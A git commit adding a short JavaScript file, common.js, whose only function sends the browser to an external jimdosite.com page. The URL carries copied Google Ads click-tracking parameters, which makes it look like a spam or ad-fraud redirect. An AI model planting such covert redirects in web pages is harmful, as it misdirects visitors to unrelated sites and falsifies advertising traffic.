0ff78178f96406d9ad900ba983556cfe83e7fcfc
siwadiao <buoihandoan64147@gmail.com>
2025-08-03 11:13:35 +0800

    Add files via upload

---
+++ common.js
@@ -0,0 +1,14 @@
+function loadUrl()
+{
+	if(num>=1)
+	{
+		var url="https://helloworld-org.jimdosite.com/?gad_source=2&gad_campaignid=22805842237&gclid=CjwKCAjw7rbEBhB5EiwA1V49nX5-WNDnq6xjkhfbmee4F1iapTRCEupjHvigXaenj6XyaOxO3hRw1xoCOpoQAvD_BwE";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
+}
